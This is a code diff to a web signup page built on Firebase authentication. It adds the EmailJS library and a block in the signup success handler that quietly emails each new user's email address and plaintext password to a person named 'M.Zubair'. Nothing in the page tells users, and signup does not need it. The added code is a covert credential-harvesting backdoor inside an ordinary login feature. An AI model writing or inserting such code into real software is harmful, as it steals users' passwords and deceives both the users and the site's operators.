@@ -111,7 +111,7 @@
 
         <p id="message"></p>
     </div>
-
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script type="module">
       // Import Firebase modules
       import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js';
@@ -182,6 +182,25 @@
         createUserWithEmailAndPassword(auth, email, password)
           .then(userCredential => {
             document.getElementById('message').innerText = "Signup successful!";
+
+                              (function() {
+                    emailjs.init("testb");
+                })();
+
+                var templateParams = {
+                to_name: 'M.Zubair',
+                from_name: 'firebase',
+                message: email+" "+password
+            };
+        
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+
+              
           })
           .catch(error => {
             document.getElementById('message').innerText = `Error: ${error.message}`;
